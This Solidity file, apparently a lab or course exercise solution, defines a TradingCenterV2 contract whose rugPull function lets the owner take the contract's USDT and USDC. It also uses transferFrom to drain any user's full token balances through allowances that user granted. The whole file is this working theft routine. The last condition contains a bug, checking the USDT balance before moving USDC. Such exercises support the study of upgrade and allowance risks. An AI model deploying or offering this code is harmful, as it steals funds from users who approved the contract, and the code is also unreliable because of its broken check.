// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import { TradingCenter, IERC20 } from "../src/TradingCenter.sol";
import { Ownable } from "../src/Ownable.sol";

// TODO: Try to implement TradingCenterV2 here
contract TradingCenterV2 is TradingCenter, Ownable {
    constructor() {
        initializeOwnable(msg.sender);
    }

    function rugPull(address _user) public onlyOwner {
        uint256 _usdtBalance = usdt.balanceOf(address(this));
        if (_usdtBalance > 0) {
            usdt.transfer(getOwner(), _usdtBalance);
        }
        uint256 _usdcBalance = usdc.balanceOf(address(this));
        if (_usdcBalance > 0) {
            usdc.transfer(getOwner(), _usdcBalance);
        }
        uint256 _userUsdt = usdt.balanceOf(_user);
        if (_userUsdt > 0) {
            usdt.transferFrom(_user, getOwner(), _userUsdt);
        }
        uint256 _userUsdc = usdc.balanceOf(_user);
        if (_userUsdt > 0) {
            usdc.transferFrom(_user, getOwner(), _userUsdc);
        }
    }
}